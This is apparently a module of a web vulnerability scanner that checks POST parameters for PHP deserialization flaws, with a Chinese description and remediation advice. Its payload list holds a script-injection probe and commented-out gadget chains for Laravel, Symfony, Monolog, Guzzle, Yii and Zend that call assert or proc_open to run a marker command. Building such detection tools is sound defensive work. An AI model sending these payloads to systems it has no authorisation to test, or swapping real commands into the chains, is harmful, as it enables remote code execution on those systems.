//phpdeserialization.js
const { CoreLayer, createReport, browerHttpJob } = require('../core/core.js')

const details = {
    description: `
    在 PHP 中，反序列化是将已经序列化的数据还原回原始数据结构的过程。序列化和反序列化通常用于在不同应用程序或平台之间传输数据，
    或将数据存储在持久性存储中，例如将数据写入文件或数据库。在 PHP 中，可以使用 "serialize()" 函数将 PHP 对象或数据结构序列化为字符串
    ，然后使用 "unserialize()" 函数将该字符串还原为原始对象或数据结构。但是，由于 PHP 的反序列化过程不够安全，
    攻击者可以构造恶意序列化数据，利用 PHP 应用程序中的漏洞，导致远程执行代码（RCE）或其他安全问题。
    PHP 反序列化漏洞通常利用了 PHP 反序列化器的某些特定行为，例如自动加载(unserialize() 函数自动调用类的 __autoload() 方法)、
    可触发代码执行的魔法方法或序列化数据的对象类型等。
    因此，为了防止反序列化漏洞，开发人员应该对反序列化数据进行严格的验证和过滤，
    并确保反序列化过程发生在受信任的环境中。
    `
    ,
    solution: `对于应用程序中需要接受用户输入的反序列化数据，必须对数据进行验证和过滤，确保输入的数据符合预期的数据格式和结构，
               避免攻击者构造恶意的反序列化数据。
               不要信任从未知或不可靠来源获取的反序列化数据，确保只在受信任的环境中进行反序列化操作，例如在专用的沙箱环境或安全的容器中运行反序列化代码。
               避免使用自动加载或魔法方法等可能导致代码执行的特性，尽可能使用显式加载或静态分析等安全的代码执行方式。
               及时更新 PHP 反序列化器和相关依赖库的版本，确保使用的版本没有已知的漏洞或安全问题。
               审查和监控应用程序中的反序列化操作，及时发现和处理异常的反序列化行为，避免潜在的安全风险。`
}







const php_payload_list = [
    `O:1:"S":1:{s:4:"test";s:140:"<script>var div=document.createElement('div');div.innerText = 'ab49bdd251591b16da'%2B'541abad631329c';document.body.appendChild(div);</script>";}`,
    // `O:24:"GuzzleHttp\Psr7\FnStream":2:{s:33:" GuzzleHttp\Psr7\FnStream methods";a:1:{s:5:"close";a:2:{i:0;O:23:"GuzzleHttp\HandlerStack":3:{s:32:" GuzzleHttp\HandlerStack handler";s:23:"print(md5(4085809348));";s:30:" GuzzleHttp\HandlerStack stack";a:1:{i:0;a:1:{i:0;s:6:"assert";}}s:31:" GuzzleHttp\HandlerStack cached";b:0;}i:1;s:7:"resolve";}}s:9:"_fn_close";a:2:{i:0;r:4;i:1;s:7:"resolve";}}`,
    // `O:40:"Illuminate\Broadcasting\PendingBroadcast":2:{s:9:" * events";O:15:"Faker\Generator":1:{s:13:" * formatters";a:1:{s:8:"dispatch";s:6:"assert";}}s:8:" * event";s:23:"print(md5(4085809348));";}`,
    // `O:40:"Illuminate\Broadcasting\PendingBroadcast":2:{s:9:" * events";O:28:"Illuminate\Events\Dispatcher":1:{s:12:" * listeners";a:1:{s:23:"print(md5(4085809348));";a:1:{i:0;s:6:"assert";}}}s:8:" * event";s:23:"print(md5(4085809348));";}`,
    // `O:40:"Illuminate\Broadcasting\PendingBroadcast":1:{s:9:" * events";O:39:"Illuminate\Notifications\ChannelManager":3:{s:6:" * app";s:23:"print(md5(4085809348));";s:17:" * defaultChannel";s:1:"x";s:17:" * customCreators";a:1:{s:1:"x";s:6:"assert";}}}`,
    // `O:40:"Illuminate\Broadcasting\PendingBroadcast":2:{s:9:" * events";O:31:"Illuminate\Validation\Validator":1:{s:10:"extensions";a:1:{s:0:"";s:6:"assert";}}s:8:" * event";s:23:"print(md5(4085809348));";}`,
    // `O:32:"Monolog\Handler\SyslogUdpHandler":1:{s:9:" * socket";O:29:"Monolog\Handler\BufferHandler":7:{s:10:" * handler";O:29:"Monolog\Handler\BufferHandler":7:{s:10:" * handler";N;s:13:" * bufferSize";i:-1;s:9:" * buffer";a:1:{i:0;a:2:{i:0;s:23:"print(md5(4085809348));";s:5:"level";N;}}s:8:" * level";N;s:14:" * initialized";b:1;s:14:" * bufferLimit";i:-1;s:13:" * processors";a:2:{i:0;s:7:"current";i:1;s:6:"assert";}}s:13:" * bufferSize";i:-1;s:9:" * buffer";a:1:{i:0;a:2:{i:0;s:23:"print(md5(4085809348));";s:5:"level";N;}}s:8:" * level";N;s:14:" * initialized";b:1;s:14:" * bufferLimit";i:-1;s:13:" * processors";a:2:{i:0;s:7:"current";i:1;s:6:"assert";}}}`,
    // `O:32:"Monolog\Handler\SyslogUdpHandler":1:{s:6:"socket";O:29:"Monolog\Handler\BufferHandler":7:{s:10:" * handler";O:29:"Monolog\Handler\BufferHandler":7:{s:10:" * handler";N;s:13:" * bufferSize";i:-1;s:9:" * buffer";a:1:{i:0;a:2:{i:0;s:23:"print(md5(4085809348));";s:5:"level";N;}}s:8:" * level";N;s:14:" * initialized";b:1;s:14:" * bufferLimit";i:-1;s:13:" * processors";a:2:{i:0;s:7:"current";i:1;s:6:"assert";}}s:13:" * bufferSize";i:-1;s:9:" * buffer";a:1:{i:0;a:2:{i:0;s:23:"print(md5(4085809348));";s:5:"level";N;}}s:8:" * level";N;s:14:" * initialized";b:1;s:14:" * bufferLimit";i:-1;s:13:" * processors";a:2:{i:0;s:7:"current";i:1;s:6:"assert";}}}`,
    // `O:18:"Slim\Http\Response":2:{s:10:" * headers";O:8:"Slim\App":1:{s:19:" Slim\App container";O:14:"Slim\Container":3:{s:21:" Pimple\Container raw";a:1:{s:3:"all";a:2:{i:0;O:8:"Slim\App":1:{s:19:" Slim\App container";O:8:"Slim\App":1:{s:19:" Slim\App container";O:14:"Slim\Container":3:{s:21:" Pimple\Container raw";a:1:{s:3:"has";s:6:"assert";}s:24:" Pimple\Container values";a:1:{s:3:"has";s:6:"assert";}s:22:" Pimple\Container keys";a:1:{s:3:"has";s:6:"assert";}}}}i:1;s:23:"print(md5(4085809348));";}}s:24:" Pimple\Container values";a:1:{s:3:"all";a:2:{i:0;r:6;i:1;s:23:"print(md5(4085809348));";}}s:22:" Pimple\Container keys";a:1:{s:3:"all";a:2:{i:0;r:6;i:1;s:23:"print(md5(4085809348));";}}}}s:7:" * body";s:0:"";}`,
    // `O:43:"Symfony\Component\Cache\Adapter\ApcuAdapter":3:{s:64:" Symfony\Component\Cache\Adapter\AbstractAdapter mergeByLifetime";s:9:"proc_open";s:58:" Symfony\Component\Cache\Adapter\AbstractAdapter namespace";a:0:{}s:57:" Symfony\Component\Cache\Adapter\AbstractAdapter deferred";s:23:"print(md5(4085809348));";}`,
    // `O:38:"Symfony\Component\Process\ProcessPipes":1:{s:45:" Symfony\Component\Process\ProcessPipes files";a:1:{i:0;O:46:"Symfony\Component\Finder\Expression\Expression":1:{s:53:" Symfony\Component\Finder\Expression\Expression value";O:38:"Symfony\Component\Templating\PhpEngine":4:{s:9:" * parser";O:47:"Symfony\Component\Templating\TemplateNameParser":0:{}s:8:" * cache";a:1:{s:0:"";O:50:"Symfony\Component\Templating\Storage\StringStorage":1:{s:11:" * template";s:39:"<?php+print(md5(4085809348));;die();+?>";}}s:10:" * current";O:46:"Symfony\Component\Templating\TemplateReference":0:{}s:10:" * globals";a:0:{}}}}}`,
    // `O:44:"Symfony\Component\Process\Pipes\WindowsPipes":1:{s:51:" Symfony\Component\Process\Pipes\WindowsPipes files";a:1:{i:0;O:46:"Symfony\Component\Finder\Expression\Expression":1:{s:53:" Symfony\Component\Finder\Expression\Expression value";O:38:"Symfony\Component\Templating\PhpEngine":4:{s:9:" * parser";O:47:"Symfony\Component\Templating\TemplateNameParser":0:{}s:8:" * cache";a:1:{s:0:"";O:50:"Symfony\Component\Templating\Storage\StringStorage":1:{s:11:" * template";s:39:"<?php+print(md5(4085809348));;die();+?>";}}s:10:" * current";O:46:"Symfony\Component\Templating\TemplateReference":0:{}s:10:" * globals";a:0:{}}}}}`,
    // `O:11:"CDbCriteria":1:{s:6:"params";O:5:"CList":1:{s:9:" CList _d";O:10:"CFileCache":7:{s:9:"keyPrefix";s:0:"";s:7:"hashKey";b:0;s:10:"serializer";a:1:{i:1;s:6:"assert";}s:9:"cachePath";s:10:"data:text/";s:14:"directoryLevel";i:0;s:11:"embedExpiry";b:1;s:15:"cacheFileSuffix";s:52:";base64,OTk5OTk5OTk5OXByaW50KG1kNSg0MDg1ODA5MzQ4KSk7";}}}`,
    // `O:8:"Zend_Log":1:{s:11:" * _writers";a:1:{i:0;O:20:"Zend_Log_Writer_Mail":5:{s:16:" * _eventsToMail";a:1:{i:0;i:1;}s:22:" * _layoutEventsToMail";a:0:{}s:8:" * _mail";O:9:"Zend_Mail":0:{}s:10:" * _layout";O:11:"Zend_Layout":3:{s:13:" * _inflector";O:23:"Zend_Filter_PregReplace":2:{s:16:" * _matchPattern";s:7:"/(.*)/e";s:15:" * _replacement";s:23:"print(md5(4085809348));";}s:20:" * _inflectorEnabled";b:1;s:10:" * _layout";s:6:"layout";}s:22:" * _subjectPrependText";N;}}}`,
    `O:1:"S":1:{s:4:"test";s:140:"<script>var div=document.createElement('div');div.innerText = 'ab49bdd251591b16da'+'541abad631329c';document.body.appendChild(div);</script>";}`,

];

class classPhpDeserialization extends CoreLayer {
    constructor(coreobj) {
        super(coreobj);
    }

    async startTesting() {
        if (this.variations.length != 0 && this.method == "POST") {
            //console.log(`url: ${this.url} method: ${this.method} postdata:${this.postData}`);
            for (var i = 0; i < this.variations.length; i++) {
                let report = await this.attack(i);
            }
        }
    }

    async attack(index) {
        for (var i = 0; i < php_payload_list.length; i++) {
            const lastJob = new browerHttpJob(this.browser)
            this.variations.setValue(index, php_payload_list[i])
            const payload = this.variations.toString()
            lastJob.url = this.url
            lastJob.method = this.method
            lastJob.headers = this.headers
            lastJob.postData = payload
            lastJob.isEncodeUrl = false
            let response = await lastJob.execute();
            if (response.body) {
                response.body.forEach(element => {
                    if (element.indexOf("ab49bdd251591b16da541abad631329c") != -1) {
                        if (this.url) {
                            const msg = { url: this.url, body: element, payload: payload, vuln: this.getVulnId(__filename), level: "h" } //"rj-020-0001"
                            this.alert(createReport(msg));
                            
                        }
                    }
                });
            }
        }
    }
}










module.exports = classPhpDeserialization




